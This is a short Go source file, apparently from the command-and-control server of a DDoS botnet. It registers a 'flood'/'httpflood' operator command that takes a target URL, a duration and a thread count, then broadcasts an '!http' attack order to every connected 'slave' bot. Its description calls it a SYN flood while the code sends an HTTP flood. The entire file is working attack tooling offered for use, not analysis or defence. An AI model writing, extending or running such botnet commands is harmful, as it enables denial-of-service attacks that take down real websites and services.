package all

import (
	"server/core/master/command"
	"server/core/master/session/sessions"
	"server/core/slave"
)

func init() {
	command.Register(&command.Command{
		Aliases:     []string{"flood", "httpflood"},
		Description: "Syn flood.",
		Admin:       false,
		Executor: func(args []string, session *sessions.Session) {
			if len(args) < 3 {
				session.Println("flood url time threads")
				return
			}
			slave.List.SendCommand("!http " + args[0] + " " + args[1] + " " + args[2])
			session.Println("Attack sent.")
		},
	})
}
